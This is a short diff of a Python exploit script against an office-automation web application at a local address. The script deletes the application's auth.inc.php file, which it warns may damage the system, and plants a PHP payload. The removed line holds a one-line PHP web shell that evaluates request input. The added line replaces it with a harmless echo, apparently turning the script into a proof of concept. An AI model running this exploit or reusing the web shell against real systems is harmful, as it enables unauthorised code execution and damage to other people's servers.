@@ -1,6 +1,6 @@
 import requests
 target="http://127.0.0.1:8203/"
-payload="<?php eval($_REQUEST['a']);?>"
+payload="<?php echo 123456 ?>"
 print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
 input("Press enter to continue")
 print("[*]Deleting auth.inc.php....")
